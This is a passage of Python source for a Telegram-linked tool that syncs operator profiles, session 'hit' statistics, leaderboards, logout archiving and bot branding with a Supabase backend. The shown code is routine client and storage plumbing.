        pass


def is_locally_logged_out():
    for d in _state_dir_candidates():
        flag = os.path.join(d, ".inpareto_logged_out")
        if not os.path.isfile(flag):
            continue
        if _dir_has_readable_session(d):
            try:
                os.remove(flag)
                log_event("STATE", "cleared stale .inpareto_logged_out")
            except OSError:
                pass
            return False
        return True
    return os.path.isfile(_logout_flag_file())


def device_row_has_active_link(row):
    """True if row is an active device link (not archived logout)."""
    if not row:
        return False
    device_hash = str(row.get("device_hash") or "")
    if device_hash.endswith("-OUT"):
        return False
    token = (row.get("telegram_bot_token") or "").strip()
    chat = (row.get("telegram_chat_id") or "").strip()
    if not token or not chat:
        return False
    if token in ("LOGGED_OUT", "null", "none"):
        return False
    if chat in ("0", "null", "none"):
        return False
    return True


def persist_device_identity(device_hash=None, chat_id=None):
    """Local session files — Telegram id is the operator key (device hash removed)."""
    if chat_id:
        _write_local_state_file(_device_chat_file(), str(chat_id).strip())


def _read_stored_chat_id():
    chat = _read_local_state_file(_device_chat_file()).strip()
    return chat if chat else ""


def get_device_hash():
    """Deprecated: device hash removed (Telegram-ID only)."""
    return ""


def is_cloud_enabled():
    return bool(SUPABASE_URL and SUPABASE_ANON_KEY)


def is_device_hash_enabled():
    """Device-hash based cloud 'devices' table is deprecated and disabled."""
    return False


def is_device_ready():
    return is_cloud_enabled() and bool(resolve_operator_id())


def is_profile_tracking_ready():
    """Local profile cache + achievements — works without cloud when operator id exists."""
    return bool(resolve_operator_id())


def resolve_operator_telegram_id():
    """Primary operator key — Telegram user/chat id (not device hash)."""
    chat = str(TELEGRAM_CHAT_ID or "").strip()
    if chat:
        return chat
    stored = _read_stored_chat_id()
    if stored:
        return stored
    return str(OPERATOR_ID or "").strip()


def resolve_operator_id(telegram_chat_id=""):
    tg = resolve_operator_telegram_id()
    if tg:
        return tg
    if telegram_chat_id:
        return str(telegram_chat_id).strip()
    return ""


def supabase_headers(prefer=None):
    headers = {
        "apikey": SUPABASE_ANON_KEY,
        "Authorization": f"Bearer {SUPABASE_ANON_KEY}",
        "Content-Type": "application/json",
    }
    if prefer:
        headers["Prefer"] = prefer
    return headers


def supabase_request(method, table, params=None, payload=None, prefer=None):
    url = f"{SUPABASE_URL}/rest/v1/{table}"
    attempts = 3
    last_err = None
    for i in range(attempts):
        try:
            response = requests.request(
                method,
                url,
                headers=supabase_headers(prefer),
                params=params,
                json=payload,
                timeout=(CLOUD_CONNECT_TIMEOUT, CLOUD_TIMEOUT),
            )
            if not response.ok:
                # Retry only on transient/rate-limit/server errors.
                if response.status_code in (429, 500, 502, 503, 504) and i < attempts - 1:
                    time.sleep(0.35 * (2**i))
                    continue
                text = (response.text or "").strip()
                msg = text[:400] if text else f"HTTP {response.status_code}"
                try:
                    j = response.json()
                    if isinstance(j, dict):
                        code = j.get("code") or j.get("error") or ""
                        detail = j.get("details") or j.get("message") or ""
                        if code or detail:
                            msg = f"HTTP {response.status_code} {code} {detail}".strip()[:400]
                except Exception:
                    pass
                return None, msg
            raw = (response.text or "").strip()
            if not raw:
                return [], None
            try:
                return response.json(), None
            except Exception:
                return None, f"Supabase invalid JSON (HTTP {response.status_code})"
        except Exception as exc:
            last_err = str(exc)[:200]
            if i < attempts - 1:
                time.sleep(0.35 * (2**i))
                continue
            return None, last_err
    return None, last_err or "Supabase request failed"


def _normalize_achievements(value):
    """Supabase may return jsonb list or a JSON string — always normalize to list[str]."""
    if value is None:
        return []
    if isinstance(value, list):
        return [str(x) for x in value if x]
    if isinstance(value, str):
        raw = value.strip()
        if not raw:
            return []
        try:
            parsed = json.loads(raw)
            if isinstance(parsed, list):
                return [str(x) for x in parsed if x]
        except json.JSONDecodeError:
            pass
        return [raw] if raw else []
    return []


def _profile_cache_path():
    return os.path.join(_device_state_dir(), ".inpareto_profile_cache.json")


def load_profile_cache(operator_id):
    oid = str(operator_id or "").strip()
    if not oid:
        return {}
    try:
        with open(_profile_cache_path(), "r", encoding="utf-8") as f:
            data = json.load(f)
        if isinstance(data, dict):
            return dict(data.get(oid) or {})
    except (OSError, json.JSONDecodeError, TypeError):
        pass
    return {}


def save_profile_cache(profile):
    oid = str((profile or {}).get("operator_id") or "").strip()
    if not oid:
        return
    payload = {
        "achievements": _normalize_achievements(profile.get("achievements")),
        "lifetime": dict(profile.get("lifetime") or {}),
        "last_milestone_hit": int(profile.get("last_milestone_hit") or 0),
    }
    try:
        try:
            with open(_profile_cache_path(), "r", encoding="utf-8") as f:
                all_data = json.load(f)
        except (OSError, json.JSONDecodeError, TypeError):
            all_data = {}
        if not isinstance(all_data, dict):
            all_data = {}
        all_data[oid] = payload
        with open(_profile_cache_path(), "w", encoding="utf-8") as f:
            json.dump(all_data, f, indent=2)
    except OSError as exc:
        log_event("CLOUD", f"profile cache write failed: {exc}"[:80])


def merge_profile_records(primary, secondary):
    """Merge two profile dicts — never drop cloud achievements/lifetime on save."""
    if not secondary:
        return primary
    if not primary:
        return secondary
    out = dict(primary)
    ach = set(_normalize_achievements(primary.get("achievements")))
    ach.update(_normalize_achievements(secondary.get("achievements")))
    out["achievements"] = sorted(ach)
    pl = dict(primary.get("lifetime") or {})
    sl = dict(secondary.get("lifetime") or {})
    merged_life = {}
    for key in (
        "sessions_completed",
        "total_hits",
        "total_generated",
        "total_runtime_sec",
        "best_session_hits",
        "best_hit_quality",
        "quality_hits_3plus",
        "quality_hits_4plus",
        "quality_hits_5",
    ):
        merged_life[key] = max(int(pl.get(key) or 0), int(sl.get(key) or 0))
    merged_life["best_hit_rate"] = max(
        float(pl.get("best_hit_rate") or 0), float(sl.get("best_hit_rate") or 0)
    )
    merged_life["best_hits_per_hour"] = max(
        float(pl.get("best_hits_per_hour") or 0), float(sl.get("best_hits_per_hour") or 0)
    )
    out["lifetime"] = merged_life
    if not out.get("first_seen") and secondary.get("first_seen"):
        out["first_seen"] = secondary["first_seen"]
    if int(secondary.get("streak_days") or 0) > int(out.get("streak_days") or 0):
        out["streak_days"] = secondary["streak_days"]
    fav = {str(u).lstrip("@").lower() for u in (out.get("favorites") or []) if u}
    fav.update(str(u).lstrip("@").lower() for u in (secondary.get("favorites") or []) if u)
    out["favorites"] = sorted(fav)
    notes = dict(out.get("favorite_notes") or {})
    notes.update(secondary.get("favorite_notes") or {})
    out["favorite_notes"] = notes
    out["last_milestone_hit"] = max(
        int(out.get("last_milestone_hit") or 0),
        int(secondary.get("last_milestone_hit") or 0),
    )
    return out


def row_to_profile(row):
    if not row:
        return None
    return {
        "operator_id": row["id"],
        "display_name": row.get("display_name") or "Operator",
        "first_seen": row.get("first_seen") or "",
        "last_active": row.get("last_active") or "",
        "last_active_date": row.get("last_active_date") or "",
        "streak_days": row.get("streak_days") or 1,
        "achievements": _normalize_achievements(row.get("achievements")),
        "favorites": row.get("favorites") or [],
        "favorite_notes": row.get("favorite_notes") or {},
        "lifetime": {
            "sessions_completed": row.get("lifetime_sessions") or 0,
            "total_hits": row.get("lifetime_hits") or 0,
            "total_generated": row.get("lifetime_generated") or 0,
            "total_runtime_sec": row.get("lifetime_runtime_sec") or 0,
            "best_session_hits": row.get("best_session_hits") or 0,
            "best_hit_rate": float(row.get("best_hit_rate") or 0),
            "best_hits_per_hour": float(row.get("best_hits_per_hour") or 0),
            "best_hit_quality": row.get("best_hit_quality") or 0,
            "quality_hits_3plus": row.get("quality_hits_3plus") or 0,
            "quality_hits_4plus": row.get("quality_hits_4plus") or 0,
            "quality_hits_5": row.get("quality_hits_5") or 0,
        },
    }


def cloud_supports_favorite_notes_column():
    return _cloud_favorite_notes_column is not False


def mark_cloud_no_favorite_notes_column():
    global _cloud_favorite_notes_column
    _cloud_favorite_notes_column = False


def cloud_supports_quality_columns():
    return _cloud_quality_columns is not False


def mark_cloud_no_quality_columns():
    global _cloud_quality_columns
    _cloud_quality_columns = False


def _supabase_missing_quality_columns(err_text):
    return any(_supabase_missing_column(err_text, key) for key in _QUALITY_CLOUD_KEYS)


def profile_to_row(profile):
    life = profile.get("lifetime", {})
    row = {
        "id": profile["operator_id"],
        "display_name": profile.get("display_name") or "Operator",
        "first_seen": profile.get("first_seen"),
        "last_active": profile.get("last_active"),
        "last_active_date": profile.get("last_active_date"),
        "streak_days": profile.get("streak_days") or 1,
        "achievements": _normalize_achievements(profile.get("achievements")),
        "favorites": profile.get("favorites") or [],
        "lifetime_sessions": life.get("sessions_completed") or 0,
        "lifetime_hits": life.get("total_hits") or 0,
        "lifetime_generated": life.get("total_generated") or 0,
        "lifetime_runtime_sec": life.get("total_runtime_sec") or 0,
        "best_session_hits": life.get("best_session_hits") or 0,
        "best_hit_rate": life.get("best_hit_rate") or 0,
        "best_hits_per_hour": life.get("best_hits_per_hour") or 0,
    }
    if cloud_supports_quality_columns():
        row["best_hit_quality"] = life.get("best_hit_quality") or 0
        row["quality_hits_3plus"] = life.get("quality_hits_3plus") or 0
        row["quality_hits_4plus"] = life.get("quality_hits_4plus") or 0
        row["quality_hits_5"] = life.get("quality_hits_5") or 0
    if cloud_supports_favorite_notes_column():
        row["favorite_notes"] = profile.get("favorite_notes") or {}
    return row


def fetch_profile(operator_id):
    data, err = supabase_request(
        "GET",
        "operators",
        params={"id": f"eq.{operator_id}", "select": "*", "limit": "1"},
    )
    if err:
        return None, err
    if not data:
        return None, None
    return row_to_profile(data[0]), None


def upsert_profile(profile):
    row = profile_to_row(profile)
    url = f"{SUPABASE_URL}/rest/v1/operators?on_conflict=id"
    try:
        response = requests.post(
            url,
            headers=supabase_headers("resolution=merge-duplicates,return=representation"),
            json=row,
            timeout=(CLOUD_CONNECT_TIMEOUT, CLOUD_TIMEOUT),
        )
        if not response.ok:
            err = response.text[:400]
            if _supabase_missing_quality_columns(err):
                mark_cloud_no_quality_columns()
                row = profile_to_row(profile)
                response = requests.post(
                    url,
                    headers=supabase_headers(
                        "resolution=merge-duplicates,return=representation",
                    ),
                    json=row,
                    timeout=(CLOUD_CONNECT_TIMEOUT, CLOUD_TIMEOUT),
                )
                if not response.ok:
                    return None, response.text[:200]
            elif _supabase_missing_column(err, "favorite_notes"):
                mark_cloud_no_favorite_notes_column()
                persist_local_favorite_notes(profile.get("favorite_notes") or {})
                row = profile_to_row(profile)
                response = requests.post(
                    url,
                    headers=supabase_headers(
                        "resolution=merge-duplicates,return=representation",
                    ),
                    json=row,
                    timeout=(CLOUD_CONNECT_TIMEOUT, CLOUD_TIMEOUT),
                )
                if not response.ok:
                    return None, response.text[:200]
            else:
                return None, err[:200]
        data = response.json()
        if isinstance(data, list) and data:
            merged = row_to_profile(data[0])
            local = load_local_favorite_notes()
            if local:
                notes = dict(local)
                notes.update(merged.get("favorite_notes") or {})
                merged["favorite_notes"] = notes
            return merged, None
        return profile, None
    except Exception as exc:
        return None, str(exc)


def insert_session(operator_id, snap):
    payload = {
        "operator_id": operator_id,
        "started_at": snap["started"],
        "ended_at": snap["ended"],
        "generated": snap["generated"],
        "valid_count": snap["valid"],
        "hits": snap["hits"],
        "errors": snap["errors"],
        "duration_sec": snap["duration_sec"],
        "hit_rate": snap["hit_rate"],
        "hits_per_hour": snap.get("hits_last_60m", 0),
    }
    _, err = supabase_request("POST", "sessions", payload=payload)
    return err


def fetch_operator_leaderboard(limit=10):
    data, err = supabase_request(
        "GET",
        "operators",
        params={
            "select": "id,display_name,lifetime_hits,best_session_hits,streak_days",
            "order": "lifetime_hits.desc",
            "limit": str(limit),
        },
    )
    if err:
        return [], err
    return data or [], None


def fetch_session_leaderboard(scope="all", limit=10):
    params = {
        "select": "operator_id,hits,hit_rate,duration_sec,ended_at",
        "order": "hits.desc,hit_rate.desc",
        "limit": str(limit),
    }
    if scope == "day":
        params["ended_at"] = f"gte.{cloud_iso_day_start()}"
    elif scope == "week":
        params["ended_at"] = f"gte.{cloud_iso_week_start()}"
    data, err = supabase_request("GET", "sessions", params=params)
    if err:
        return [], err
    return data or [], None


def fetch_operator_rank(operator_id):
    data, err = supabase_request(
        "GET",
        "operators",
        params={
            "select": "id,lifetime_hits",
            "order": "lifetime_hits.desc",
            "limit": "1000",
        },
    )
    if err or not data:
        return None, err
    for idx, row in enumerate(data, start=1):
        if row.get("id") == operator_id:
            return idx, None
    return None, None


def cloud_iso_day_start():
    now = datetime.now(timezone.utc)
    start = now.replace(hour=0, minute=0, second=0, microsecond=0)
    return start.isoformat()


def cloud_iso_week_start():
    now = datetime.now(timezone.utc)
    start = now - timedelta(days=7)
    return start.isoformat()


def fetch_device_record(device_hash):
    data, err = supabase_request(
        "GET",
        "devices",
        params={
            "device_hash": f"eq.{device_hash}",
            "select": "*",
            "limit": "1",
        },
    )
    if err:
        return None, err
    if not data:
        return None, None
    return data[0], None


def fetch_device_record_by_telegram_id(chat_id):
    """Load operator session by Telegram id (primary), not device hash."""
    chat_id = str(chat_id or "").strip()
    if not chat_id or not is_cloud_enabled():
        return None, None
    data, err = supabase_request(
        "GET",
        "devices",
        params={
            "telegram_chat_id": f"eq.{chat_id}",
            "select": "*",
            "limit": "15",
        },
    )
    if err:
        return None, err
    if not data:
        return None, None
    for row in data:
        if device_row_has_active_link(row):
            return row, None
    return None, None


def apply_api_host_from_record(record):
    global ip, port
    if not record:
        return False
    host = record.get("api_host")
    if host and ":" in host:
        ip, port = host.rsplit(":", 1)
        return True
    pub = record.get("api_public_ip")
    api_port = record.get("api_port")
    if pub and api_port:
        ip = pub
        port = str(api_port)
        return True
    return False


def apply_api_host_from_cloud():
    if not is_cloud_enabled() or not is_device_hash_enabled():
        return False
    record, err = fetch_device_record(DEVICE_HASH)
    if err or not record:
        return False
    return apply_api_host_from_record(record)


def save_device_record(device_hash, bot_token, chat_id, display_name=None):
    existing, _ = fetch_device_record(device_hash)
    is_new = not existing
    was_unlinked = bool(
        existing
        and not (existing.get("telegram_bot_token") and existing.get("telegram_chat_id"))
    )
    now = datetime.now(timezone.utc).isoformat()
    new_chat = str(chat_id).strip()
    payload = {
        "device_hash": device_hash,
        "telegram_bot_token": bot_token,
        "telegram_chat_id": new_chat,
        "display_name": display_name or f"Op-{device_hash[:8]}",
        "hostname": platform.node(),
        "last_seen": now,
    }
    if existing:
        old_chat = str(existing.get("telegram_chat_id") or "").strip()
        for key in ("api_host", "api_public_ip", "api_port"):
            if existing.get(key) is not None:
                payload[key] = existing[key]
        if old_chat and new_chat and old_chat != new_chat:
            payload["operator_hit_group_id"] = None
            clear_local_hit_group_owner()
            if cloud_supports_hit_group_owner_column():
                payload["operator_hit_group_operator_id"] = None
        elif existing.get("operator_hit_group_id"):
            gid = str(existing["operator_hit_group_id"]).strip()
            owner = resolve_hit_group_owner(existing)
            if owner and new_chat and owner == new_chat:
                payload["operator_hit_group_id"] = gid
                persist_local_hit_group_id(gid)
                persist_local_hit_group_owner(owner)
                if cloud_supports_hit_group_owner_column():
                    payload["operator_hit_group_operator_id"] = owner
            elif record_hit_group_owned_by_current_session(
                {**existing, "telegram_chat_id": new_chat},
                chat_id=new_chat,
            ):
                payload["operator_hit_group_id"] = gid
                persist_local_hit_group_id(gid)
                persist_local_hit_group_owner(new_chat)
                if cloud_supports_hit_group_owner_column():
                    payload["operator_hit_group_operator_id"] = new_chat
            else:
                payload["operator_hit_group_id"] = None
                clear_local_hit_group_id()
                clear_local_hit_group_owner()
                if cloud_supports_hit_group_owner_column():
                    payload["operator_hit_group_operator_id"] = None
    if not payload.get("operator_hit_group_id") and new_chat:
        inherited = fetch_operator_hit_group_id_for_telegram_user(new_chat)
        if inherited:
            payload["operator_hit_group_id"] = inherited
            persist_local_hit_group_id(inherited)
            persist_local_hit_group_owner(new_chat)
            if cloud_supports_hit_group_owner_column():
                payload["operator_hit_group_operator_id"] = new_chat
    try:
        save_err = _post_devices_row(
            payload, prefer="resolution=merge-duplicates,return=representation",
        )
        if save_err:
            return save_err
        persist_device_identity(device_hash, chat_id)
        if device_hash == DEVICE_HASH:
            reconcile_operator_hit_group()
        if is_new or was_unlinked:
            try:
                admin_load_settings()
                log_row = dict(existing or {})
                log_row.update(payload)
                admin_notify_logs_new_device(device_hash, log_row, str(chat_id))
                schedule_operator_bot_branding(bot_token)
            except Exception:
                pass
        return None
    except Exception as exc:
        return str(exc)


def apply_telegram_credentials(bot_token, chat_id):
    global TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, OPERATOR_ID
    global TELEGRAM_ENABLED, TELEGRAM_API_URL
    TELEGRAM_BOT_TOKEN = bot_token.strip()
    TELEGRAM_CHAT_ID = str(chat_id).strip()
    OPERATOR_ID = TELEGRAM_CHAT_ID
    TELEGRAM_API_URL = (
        f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"
        if TELEGRAM_BOT_TOKEN
        else ""
    )
    TELEGRAM_ENABLED = bool(TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID)
    if TELEGRAM_ENABLED:
        persist_local_bot_token(TELEGRAM_BOT_TOKEN)
        persist_device_identity(None, TELEGRAM_CHAT_ID)
        clear_local_logged_out()
        refresh_terminal_license_from_cloud()
        sync_local_hit_group_from_cloud()
        try:
            operator_link_set(TELEGRAM_CHAT_ID, TELEGRAM_BOT_TOKEN, "")
        except Exception:
            pass
    if TELEGRAM_CHAT_ID:
        schedule_sync_telegram_commands(TELEGRAM_CHAT_ID)
    if TELEGRAM_ENABLED:
        preload_startup_photo_async()


def record_hit_group_owned_by_current_session(record, chat_id=None):
    """Hit group belongs to this Telegram user (owner column or same linked chat_id)."""
    if not record:
        return False
    gid = str(record.get("operator_hit_group_id") or "").strip()
    if not gid:
        return False
    current = str(chat_id or resolve_operator_telegram_id() or "").strip()
    if not current:
        return False
    owner = resolve_hit_group_owner(record)
    if owner:
        return owner == current
    return str(record.get("telegram_chat_id") or "").strip() == current


def fetch_operator_hit_group_id_for_telegram_user(chat_id=None):
    """Hit group by Telegram user id — registry only (device-hash removed)."""
    chat_id = str(chat_id or TELEGRAM_CHAT_ID or "").strip()
    if not chat_id or not is_cloud_enabled():
        return None

    from_registry = user_hit_group_get(chat_id)
    if from_registry:
        return from_registry
    return None


def update_hit_group_for_telegram_user(chat_id, group_id):
    """Deprecated: device-hash based devices table removed."""
    return None


def reconcile_operator_hit_group():
    """Hit group follows Telegram id + local .inpareto_hit_group (not device fingerprint)."""
    global _cached_hit_group_id
    if is_locally_logged_out():
        _cached_hit_group_id = None
        return None
    chat_id = resolve_operator_telegram_id()
    if not chat_id:
        _cached_hit_group_id = None
        return None

    local_gid = read_local_hit_group_id()
    if local_gid:
        _cached_hit_group_id = local_gid
        if chat_id and not read_local_hit_group_owner():
            persist_local_hit_group_owner(chat_id)
        if is_cloud_enabled():
            threading.Thread(
                target=update_hit_group_for_telegram_user,
                args=(chat_id, local_gid),
                daemon=True,
                name="hg-cloud-sync",
            ).start()
        return local_gid

    if is_cloud_enabled():
        inherited = fetch_operator_hit_group_id_for_telegram_user(chat_id)
        if inherited:
            _cached_hit_group_id = inherited
            persist_local_hit_group_id(inherited)
            persist_local_hit_group_owner(chat_id)
            return inherited

    _cached_hit_group_id = None
    return None


def clear_telegram_session():
    global _cached_hit_group_id
    apply_telegram_credentials("", "")
    _cached_hit_group_id = None
    clear_local_hit_group_owner()
    clear_local_hit_group_id()
    global _operator_access_sticky_until
    _operator_access_sticky_until = 0.0
    clear_fav_note_pending()
    CMD_REPLY_PANEL["chat_id"] = None
    CMD_REPLY_PANEL["message_id"] = None
    CMD_REPLY_PANEL["is_photo"] = False
    STARTUP_PANEL["chat_id"] = None
    STARTUP_PANEL["message_id"] = None
    STARTUP_PANEL["has_photo"] = False
    invalidate_operator_gate_cache()
    set_live_watch(False)
    admin_invalidate_access()
    pause_event.clear()


def archive_device_session(device_hash):
    """Mark cloud row as logged out: move PK to hash-OUT, clear Telegram link."""
    device_hash = (device_hash or "").strip()
    if not device_hash:
        return False, "No device hash"
    if device_hash.endswith("-OUT"):
        return False, "Already logged out"
    if not is_cloud_enabled():
        return False, "Cloud offline"

    record, err = fetch_device_record(device_hash)
    if err:
        return False, err
    if not record:
        return False, "No cloud profile for this device"

    preserve_operator_hit_group_for_user(
        str(record.get("telegram_chat_id") or "").strip()
        or _read_stored_chat_id()
    )

    archived_hash = f"{device_hash}-OUT"
    now = datetime.now(timezone.utc).isoformat()
    # Keep token/chat on the -OUT row (audit). Active row is deleted so relink is fresh.
    # Do not use null — many Supabase DBs still have NOT NULL on these columns.
    archive_payload = {
        "device_hash": archived_hash,
        "telegram_bot_token": (record.get("telegram_bot_token") or "").strip() or "LOGGED_OUT",
        "telegram_chat_id": (record.get("telegram_chat_id") or "").strip() or "0",
        "display_name": f"{record.get('display_name') or 'Operator'} [OUT]",
        "hostname": record.get("hostname") or platform.node(),
        "last_seen": now,
    }
    for key in (
        "api_host",
        "api_public_ip",
        "api_port",
        "first_seen",
        "operator_hit_group_id",
        "operator_hit_group_operator_id",
    ):
        if record.get(key) is not None:
            archive_payload[key] = record[key]

    try:
        post_url = f"{SUPABASE_URL}/rest/v1/devices?on_conflict=device_hash"
        post_resp = requests.post(
            post_url,
            headers=supabase_headers("resolution=merge-duplicates"),
            json=archive_payload,
            timeout=CLOUD_TIMEOUT,
        )
        if not post_resp.ok:
            return False, _parse_supabase_error(post_resp.text)

        del_url = f"{SUPABASE_URL}/rest/v1/devices"
        del_resp = requests.delete(
            del_url,
            headers=supabase_headers(),
            params={"device_hash": f"eq.{device_hash}"},
            timeout=CLOUD_TIMEOUT,
        )
        if not del_resp.ok:
            for _ in range(3):
                try:
                    del_resp = requests.delete(
                        del_url,
                        headers=supabase_headers(),
                        params={"device_hash": f"eq.{device_hash}"},
                        timeout=CLOUD_TIMEOUT,
                    )
                    if del_resp.ok:
                        return True, archived_hash
                except Exception:
                    pass
                time.sleep(0.35)
            scrub_err = update_device_fields(
                device_hash,
                telegram_bot_token="LOGGED_OUT",
                telegram_chat_id="0",
                display_name=f"{record.get('display_name') or 'Operator'} [LOGGED OUT]",
                last_seen=now,
            )
            try:
                requests.delete(
                    del_url,
                    headers=supabase_headers(),
                    params={"device_hash": f"eq.{archived_hash}"},
                    timeout=CLOUD_TIMEOUT,
                )
            except Exception:
                pass
            if scrub_err:
                return False, _parse_supabase_error(del_resp.text)
            return True, archived_hash
    except Exception as exc:
        return False, str(exc)[:120]

    return True, archived_hash


def _parse_supabase_error(raw):
    """Short user-facing message from PostgREST JSON."""
    text = (raw or "").strip()
    if not text:
        return "Cloud error"
    try:
        row = json.loads(text)
        msg = row.get("message") or text
        hint = row.get("hint") or ""
        if "not-null" in str(msg).lower() or "23502" in str(row.get("code", "")):
            return (
                "Database needs nullable Telegram columns. "
                "Run in Supabase SQL: "
                "alter table devices alter column telegram_bot_token drop not null; "
                "alter table devices alter column telegram_chat_id drop not null;"
            )
        if "operator_hit_group_operator_id" in str(msg).lower() or "pgrst204" in str(
            row.get("code", "")
        ).lower():
            return (
                "Add Supabase column: "
                "alter table public.devices add column if not exists "
                "operator_hit_group_operator_id text;"
            )
        return str(msg)[:200] + (f" ({hint})" if hint else "")
    except Exception:
        return text[:200]


def operator_bot_api_post(bot_token, method, data=None, files=None, *, timeout=None):
    token = (bot_token or "").strip()
    if not token:
        return None, "missing token"
    if timeout is None:
        timeout = BOT_PHOTO_DOWNLOAD_TIMEOUT if files else CLOUD_TIMEOUT
    try:
        response = requests.post(
            f"https://api.telegram.org/bot{token}/{method}",
            data=data,
            files=files,
            timeout=timeout,
        )
        return response, None
    except Exception as exc:
        return None, str(exc)[:80]


def operator_bot_api_post_with_retries(
    bot_token, method, data=None, files=None, *, max_retries=None, label="BRAND",
):
    if max_retries is None:
        max_retries = BOT_BRANDING_RETRIES
    last_err = "unknown"
    for attempt in range(1, max_retries + 1):
        response, err = operator_bot_api_post(bot_token, method, data, files)
        if not err and response and response.ok:
            if attempt > 1:
                log_event(label, f"OK after {attempt} tries")
            return response, None
        last_err = err or (response.text[:120] if response else "failed")
        if attempt < max_retries:
            wait = BOT_BRANDING_RETRY_DELAY * attempt
            log_event(label, f"retry {attempt}/{max_retries}: {str(last_err)[:50]}")
            time.sleep(wait)
    return None, last_err


def _fetch_url_with_retries(url, *, timeout, retries, delay, label="FETCH"):
    last_err = "unknown"
    for attempt in range(1, retries + 1):
        try:
            response = session.get(url, timeout=timeout, allow_redirects=True)
            if response.ok and response.content:
                ctype = response.headers.get("Content-Type", "image/jpeg")
                return response.content, ctype
            last_err = f"HTTP {response.status_code}"
        except Exception as exc:
            last_err = str(exc)
        if attempt < retries:
            log_event(label, f"retry {attempt}/{retries}: {str(last_err)[:60]}")
            time.sleep(delay * attempt)
    log_event(label, f"failed: {str(last_err)[:72]}")
    return None, None


def _ensure_jpeg_image_bytes(image_bytes, content_type):
    """Telegram bot profile photos must be static JPEG."""
    ct = (content_type or "").lower()
    if "jpeg" in ct or "jpg" in ct:
        return image_bytes, "image/jpeg"
    try:
        from PIL import Image
        import io as _io
        img = Image.open(_io.BytesIO(image_bytes))
        if img.mode in ("RGBA", "P", "LA"):
            bg = Image.new("RGB", img.size, (255, 255, 255))
            if img.mode == "P":
                img = img.convert("RGBA")
            bg.paste(img, mask=img.split()[-1] if img.mode in ("RGBA", "LA") else None)
            img = bg
        elif img.mode != "RGB":
            img = img.convert("RGB")
        out = _io.BytesIO()
        img.save(out, format="JPEG", quality=92)
        return out.getvalue(), "image/jpeg"
    except ImportError:
        log_event("BRAND PFP", "PNG/WebP needs Pillow — pip install Pillow or use .jpg URL")
        return None, None
    except Exception as exc:
        log_event("BRAND PFP", f"image convert failed: {str(exc)[:60]}")
        return None, None


def _set_bot_profile_photo(token, image_bytes, content_type):
    """setMyProfilePhoto — InputProfilePhotoStatic attach:// format (Bot API 9.x)."""
    jpeg_bytes, jpeg_ct = _ensure_jpeg_image_bytes(image_bytes, content_type)
    if not jpeg_bytes:
        return None, "photo: need JPEG (use .jpg URL or install Pillow)"
    attach_key = "profile_photo"
    files = {attach_key: ("profile.jpg", jpeg_bytes, jpeg_ct or "image/jpeg")}
    data = {
        "photo": json.dumps({"type": "static", "photo": f"attach://{attach_key}"}),
    }
    return operator_bot_api_post_with_retries(
        token, "setMyProfilePhoto", data=data, files=files, label="BRAND PFP",
    )


def _stash_startup_loading_message(chat_id, response):
    mid = telegram_sent_message_id(response)
    cid = str(chat_id or "").strip()
    if cid and mid:
        with _startup_loading_lock:
            _startup_loading_discard[cid] = mid


def _take_startup_loading_discard(chat_id):
    cid = str(chat_id or "").strip()
    if not cid:
        return None
    with _startup_loading_lock:
        mid = _startup_loading_discard.pop(cid, None)
    if mid:
        return (cid, mid)
    return None


def schedule_operator_bot_branding(bot_token=None, *, rounds=3, delay_sec=None):
    """Re-apply bot name/description/PFP — Telegram often needs a few tries after link."""
    token = (bot_token or TELEGRAM_BOT_TOKEN or "").strip()
    if not token:
        return
    if delay_sec is None:
        delay_sec = BOT_BRANDING_RETRY_DELAY
    key = token[:24]
    if key in _branding_schedule_keys:
        return
    _branding_schedule_keys.add(key)

    def worker():
        try:
            last_msg = ""
            for i in range(rounds):
                if i > 0:
                    time.sleep(delay_sec * i)
                ok, last_msg = apply_operator_bot_branding(token)
                if ok and "photo" in last_msg and "warnings" not in last_msg:
                    break
                if ok and "photo" not in last_msg:
                    break
        finally:
            _branding_schedule_keys.discard(key)

    threading.Thread(target=worker, daemon=True, name="bot-brand").start()


def apply_operator_bot_branding(bot_token=None):
    """Apply admin-defined name, description & photo to an operator bot."""
    admin_load_settings()
    token = (bot_token or TELEGRAM_BOT_TOKEN or "").strip()
    if not token:
        return False, "No bot token"

    name = (_admin_settings.get("operator_bot_name") or "").strip()
    desc = (_admin_settings.get("operator_bot_description") or "").strip()
    short = (_admin_settings.get("operator_bot_short_description") or "").strip()
    photo_url = (_admin_settings.get("operator_bot_photo_url") or "").strip()
    steps = []
    errors = []

    if name:
        response, err = operator_bot_api_post_with_retries(
            token, "setMyName", {"name": name[:64]}, label="BRAND NAME",
        )
        if err:
            errors.append(f"name: {err}")
        elif response and response.ok:
            steps.append("name")
        else:
            errors.append(f"name: {(response.text[:80] if response else 'failed')}")

    if desc:
        response, err = operator_bot_api_post_with_retries(
            token, "setMyDescription", {"description": desc[:512]}, label="BRAND DESC",
        )
        if err:
            errors.append(f"desc: {err}")
        elif response and response.ok:
            steps.append("description")
        else:
            errors.append(f"desc: {(response.text[:80] if response else 'failed')}")

    if short:
        response, err = operator_bot_api_post_with_retries(
            token,
            "setMyShortDescription",
            {"short_description": short[:120]},
            label="BRAND SHORT",
        )
        if err:
            errors.append(f"short: {err}")
        elif response and response.ok:
            steps.append("short")
        else:
            errors.append(f"short: {(response.text[:80] if response else 'failed')}")

    if photo_url:
        image_bytes, content_type = _fetch_url_with_retries(
            photo_url,
            timeout=BOT_PHOTO_DOWNLOAD_TIMEOUT,
            retries=BOT_BRANDING_RETRIES,
            delay=BOT_BRANDING_RETRY_DELAY,
            label="BRAND IMG",
        )
        if not image_bytes:
            errors.append("photo: download failed")
        else:
            response, err = _set_bot_profile_photo(token, image_bytes, content_type)
            if err:
                errors.append(str(err))
            elif response and response.ok:
                steps.append("photo")
            else:
                detail = response.text[:120] if response else "failed"
                try:
                    detail = response.json().get("description", detail) if response else detail
                except Exception:
                    pass
                errors.append(f"photo: {detail}")

    if not steps and not errors:
        return False, "No branding fields configured (use /set botname …)"
    if errors and not steps:
        return False, "; ".join(errors)
    detail = ", ".join(steps)
    if errors:
        detail += f" · warnings: {'; '.join(errors)}"
    return True, detail


_operator_bot_id_cache = {}
_cached_hit_group_id = None
_cloud_hit_group_owner_column = None  # None=unknown, False=column missing in Supabase


def cloud_supports_hit_group_owner_column():
    return _cloud_hit_group_owner_column is not False


def mark_cloud_no_hit_group_owner_column():
    global _cloud_hit_group_owner_column
    _cloud_hit_group_owner_column = False


def _supabase_missing_column(err_text, column):
    text = (err_text or "").lower()
